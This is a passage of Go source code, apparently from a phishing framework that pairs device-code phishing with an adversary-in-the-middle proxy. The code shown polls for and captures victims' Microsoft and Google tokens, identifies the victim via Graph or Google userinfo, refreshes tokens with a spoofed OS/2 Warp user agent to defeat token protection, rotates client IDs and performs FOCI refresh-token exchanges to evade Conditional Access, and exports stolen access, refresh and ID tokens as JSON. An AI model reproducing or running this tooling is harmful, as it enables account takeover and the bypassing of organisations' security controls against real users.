			default:
				// Check for CAP error in any error response
				if session.CAPBypassMode && IsCAPError(errResp.ErrorDescription) {
					log.Warning("[devicecode] [%s] CAP BLOCK DETECTED (client: %s): %s", session.ID, session.ClientName, errResp.ErrorDescription)
					
					if m.rotateCAPBypassClient(session) {
						log.Info("[devicecode] [%s] Rotated to bypass client %d/%d: %s - NEW CODE: %s", 
							session.ID, session.CAPBypassIndex+1, len(CAPBypassClients), session.ClientName, session.UserCode)
						ticker.Reset(time.Duration(session.Interval) * time.Second)
						continue
					}
					// All bypass clients exhausted
					session.mu.Lock()
					session.State = DCStateFailed
					session.Error = fmt.Sprintf("CAP bypass failed - all %d clients blocked: %s", len(CAPBypassClients), errResp.ErrorDescription)
					session.mu.Unlock()
					log.Error("[devicecode] [%s] CAP bypass EXHAUSTED - all %d clients blocked", session.ID, len(CAPBypassClients))
					return
				}
				session.mu.Lock()
				session.State = DCStateFailed
				session.Error = errResp.ErrorDescription
				session.mu.Unlock()
				log.Error("[devicecode] [%s] error: %s", session.ID, errResp.ErrorDescription)
				return
			}
		}
	}
}

// fetchUserInfo fetches user profile from appropriate provider API
func (m *DeviceCodeManager) fetchUserInfo(session *DeviceCodeSession) {
	session.mu.Lock()
	token := session.AccessToken
	provider := session.Provider
	session.mu.Unlock()

	if token == "" {
		return
	}

	var userinfoURL string
	switch provider {
	case DCProviderGoogle:
		userinfoURL = GOOGLE_USERINFO_URL
	default:
		userinfoURL = MS_GRAPH_ME_URL
	}

	req, err := http.NewRequest("GET", userinfoURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Debug("[devicecode] [%s] failed to fetch user info: %v", session.ID, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}

		switch provider {
		case DCProviderGoogle:
			var guser GoogleUserInfo
			if err := json.Unmarshal(body, &guser); err != nil {
				return
			}
			session.mu.Lock()
			session.GoogleUser = &guser
			session.mu.Unlock()

			displayName := guser.Name
			if displayName == "" {
				displayName = guser.Email
			}
			domain := guser.HD
			if domain == "" {
				domain = "gmail.com"
			}
			log.Success("[devicecode] [%s] Google user identified: %s (%s) [%s]", session.ID, displayName, guser.Email, domain)

		default:
			var user MSGraphUser
			if err := json.Unmarshal(body, &user); err != nil {
				return
			}
			session.mu.Lock()
			session.UserInfo = &user
			session.mu.Unlock()

			displayName := user.DisplayName
			if displayName == "" {
				displayName = user.UserPrincipalName
			}
			log.Success("[devicecode] [%s] Microsoft user identified: %s (%s)", session.ID, displayName, user.UserPrincipalName)
		}
	}
}

// RefreshAccessToken refreshes an expired access token using the refresh token
func (m *DeviceCodeManager) RefreshAccessToken(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	return m.doRefreshToken(session, "")
}

// RequestTokenWithBypassUA refreshes with OS/2 Warp UA to bypass token protection
func (m *DeviceCodeManager) RequestTokenWithBypassUA(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	return m.doRefreshToken(session, OS2_WARP_UA)
}

// doRefreshToken performs the actual token refresh (provider-aware)
func (m *DeviceCodeManager) doRefreshToken(session *DeviceCodeSession, userAgent string) error {
	session.mu.Lock()
	refreshToken := session.RefreshToken
	clientID := session.ClientID
	clientSecret := session.ClientSecret
	provider := session.Provider
	tenant := session.Tenant
	scope := session.Scope
	session.mu.Unlock()

	if refreshToken == "" {
		return fmt.Errorf("no refresh token available")
	}

	var tokenURL string
	switch provider {
	case DCProviderGoogle:
		tokenURL = GOOGLE_TOKEN_URL
	default:
		tokenURL = fmt.Sprintf(MS_TOKEN_URL, tenant)
	}

	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	// Google requires client_secret for refresh
	if provider == DCProviderGoogle && clientSecret != "" {
		data.Set("client_secret", clientSecret)
	}

	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
		log.Info("[devicecode] [%s] using bypass UA: %s", session.ID, userAgent)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("token refresh failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		return fmt.Errorf("refresh failed (%d): %s", resp.StatusCode, errResp.ErrorDescription)
	}

	var tokenResp TokenResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return fmt.Errorf("failed to parse token response: %v", err)
	}

	session.mu.Lock()
	session.AccessToken = tokenResp.AccessToken
	if tokenResp.RefreshToken != "" {
		session.RefreshToken = tokenResp.RefreshToken
	}
	session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
	session.TokenScope = tokenResp.Scope
	session.mu.Unlock()

	log.Success("[devicecode] [%s] token refreshed successfully (expires: %s)", session.ID, session.TokenExpiry.Format("15:04:05"))
	return nil
}

// GetSession returns a device code session by ID
func (m *DeviceCodeManager) GetSession(sessionID string) (*DeviceCodeSession, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[sessionID]
	return s, ok
}

// GetAllSessions returns all device code sessions
func (m *DeviceCodeManager) GetAllSessions() []*DeviceCodeSession {
	m.mu.RLock()
	defer m.mu.RUnlock()

	sessions := make([]*DeviceCodeSession, 0, len(m.sessions))
	for _, s := range m.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

// DeleteSession removes a device code session
func (m *DeviceCodeManager) DeleteSession(sessionID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[sessionID]
	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	// Cancel polling if active
	if session.State == DCStateWaiting {
		close(session.pollCancel)
	}

	delete(m.sessions, sessionID)
	return nil
}

// DeleteAllSessions removes all device code sessions
func (m *DeviceCodeManager) DeleteAllSessions() int {
	m.mu.Lock()
	defer m.mu.Unlock()

	count := len(m.sessions)
	for _, s := range m.sessions {
		if s.State == DCStateWaiting {
			close(s.pollCancel)
		}
	}
	m.sessions = make(map[string]*DeviceCodeSession)
	return count
}

// CancelPolling cancels polling for a session
func (m *DeviceCodeManager) CancelPolling(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	if session.State == DCStateWaiting {
		close(session.pollCancel)
	}
	return nil
}

// ExportTokens exports tokens as JSON
func (m *DeviceCodeManager) ExportTokens(sessionID string) (string, error) {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("session not found: %s", sessionID)
	}

	session.mu.Lock()
	defer session.mu.Unlock()

	if session.State != DCStateCaptured {
		return "", fmt.Errorf("no tokens captured for session %s (state: %s)", sessionID, session.State)
	}

	export := map[string]interface{}{
		"session_id":    session.ID,
		"provider":      session.Provider,
		"client_name":   session.ClientName,
		"client_id":     session.ClientID,
		"tenant":        session.Tenant,
		"access_token":  session.AccessToken,
		"refresh_token": session.RefreshToken,
		"id_token":      session.IDToken,
		"scope":         session.TokenScope,
		"expires_at":    session.TokenExpiry.Format(time.RFC3339),
		"captured_at":   session.CapturedAt.Format(time.RFC3339),
	}

	if session.UserInfo != nil {
		export["microsoft_user"] = session.UserInfo
	}

	if session.GoogleUser != nil {
		export["google_user"] = session.GoogleUser
	}

	if session.LinkedSession != "" {
		export["linked_aitm_session"] = session.LinkedSession
	}

	data, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to export: %v", err)
	}

	return string(data), nil
}

// LinkToAitmSession links a device code session to an AitM proxy session
func (m *DeviceCodeManager) LinkToAitmSession(dcSessionID string, aitmSessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[dcSessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", dcSessionID)
	}

	session.mu.Lock()
	session.LinkedSession = aitmSessionID
	session.mu.Unlock()

	return nil
}

// GetClientNames returns a comma-separated list of available client aliases
func (m *DeviceCodeManager) GetClientNames() string {
	names := make([]string, 0, len(KnownClientIDs))
	for k := range KnownClientIDs {
		names = append(names, k)
	}
	return strings.Join(names, ", ")
}

// GetScopePresetNames returns a comma-separated list of available scope presets
func (m *DeviceCodeManager) GetScopePresetNames() string {
	names := make([]string, 0, len(ScopePresets))
	for k := range ScopePresets {
		names = append(names, k)
	}
	return strings.Join(names, ", ")
}

// IsCodeValid returns true if the device code hasn't expired
func (s *DeviceCodeSession) IsCodeValid() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.State == DCStateWaiting && time.Now().Before(s.ExpiresAt)
}

// TimeRemaining returns time remaining before device code expires
func (s *DeviceCodeSession) TimeRemaining() time.Duration {
	s.mu.Lock()
	defer s.mu.Unlock()
	remaining := time.Until(s.ExpiresAt)
	if remaining < 0 {
		return 0
	}
	return remaining
}

// ============================================================================
// FOCI (Family of Client IDs) TOKEN EXCHANGE
// ============================================================================
// Microsoft's FOCI allows refresh tokens to be exchanged between first-party apps.
// This enables bypassing Conditional Access by pivoting from a blocked client
// to one that might be whitelisted.

// IsFOCIClient checks if a client ID is part of the FOCI family
func IsFOCIClient(clientID string) bool {
	for _, id := range FOCIClients {
		if id == clientID {
			return true
		}
	}
	return false
}

// ExchangeFOCIToken exchanges a refresh token from one FOCI client to another.
// This can bypass Conditional Access policies that block specific client apps.
// The original refresh token must be from a FOCI-enabled client.
//
// Usage: If ms_office is blocked by CAP, try exchanging to ms_365 or ms_teams
func (m *DeviceCodeManager) ExchangeFOCIToken(sessionID string, newClientAlias string, newScope string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	session.mu.Lock()
	refreshToken := session.RefreshToken
	provider := session.Provider
	tenant := session.Tenant
	originalClientID := session.ClientID
	session.mu.Unlock()

	if refreshToken == "" {
		return fmt.Errorf("no refresh token available for FOCI exchange")
	}

	if provider != DCProviderMicrosoft {
		return fmt.Errorf("FOCI exchange only works with Microsoft tokens")
	}

	// Check if original client is FOCI-enabled
	if !IsFOCIClient(originalClientID) {
		log.Warning("[devicecode] [%s] original client %s is not FOCI-enabled, exchange may fail", sessionID, originalClientID)
	}

	// Get new client ID
	newClient, ok := KnownClientIDs[newClientAlias]
	if !ok {
		return fmt.Errorf("unknown client alias: %s", newClientAlias)
	}

	newClientID := newClient.ClientID
	if !IsFOCIClient(newClientID) {
		log.Warning("[devicecode] [%s] target client %s is not FOCI-enabled, exchange may fail", sessionID, newClientAlias)
	}

	// Resolve scope
	scope := newScope
	if s, ok := ScopePresets[newScope]; ok {
		scope = s
	}

	tokenURL := fmt.Sprintf(MS_TOKEN_URL, tenant)

	data := url.Values{}
	data.Set("client_id", newClientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	log.Info("[devicecode] [%s] FOCI exchange: %s -> %s", sessionID, originalClientID[:8]+"...", newClientAlias)

	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Errorf("failed to create FOCI exchange request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// Use OS/2 Warp UA to bypass token protection
	req.Header.Set("User-Agent", OS2_WARP_UA)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("FOCI exchange request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read FOCI response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		return fmt.Errorf("FOCI exchange failed (%d): %s - %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return fmt.Errorf("failed to parse FOCI response: %v", err)
	}

	// Update session with new tokens (keep original session but update client info)
	session.mu.Lock()
	session.AccessToken = tokenResp.AccessToken
	if tokenResp.RefreshToken != "" {
		session.RefreshToken = tokenResp.RefreshToken
	}
	session.ClientID = newClientID
	session.ClientName = newClient.Name
	session.TokenScope = sanitizeRefreshScope(tokenResp.Scope)
	session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
	session.Metadata["foci_exchange"] = fmt.Sprintf("%s -> %s", originalClientID, newClientID)
	session.mu.Unlock()

	log.Success("[devicecode] [%s] FOCI exchange successful! New client: %s", sessionID, newClient.Name)
	return nil
}

// TryFOCIBypass attempts to exchange tokens through multiple FOCI clients
// to find one that bypasses the current Conditional Access policy.
// Returns the successful client alias or error if all fail.
func (m *DeviceCodeManager) TryFOCIBypass(sessionID string, scope string) (string, error) {
	// Priority order: enrollment/broker clients first (more likely to be whitelisted)
	bypassClients := []string{
		"ms_auth_broker",   // Highest chance - device enrollment
		"ms_cxh_host",      // Windows OOBE
		"ms_intune_portal", // Device compliance enrollment
		"ms_wam",           // Windows broker
		"ms_365",           // Newer unified app
		"azure_cli",        // Admin tool
		"ms_teams",         // Common FOCI member
	}

	for _, clientAlias := range bypassClients {
		log.Info("[devicecode] [%s] trying FOCI bypass with %s...", sessionID, clientAlias)
		err := m.ExchangeFOCIToken(sessionID, clientAlias, scope)
		if err == nil {
			return clientAlias, nil
		}
		log.Debug("[devicecode] [%s] %s failed: %v", sessionID, clientAlias, err)
	}

	return "", fmt.Errorf("all FOCI bypass attempts failed")
}
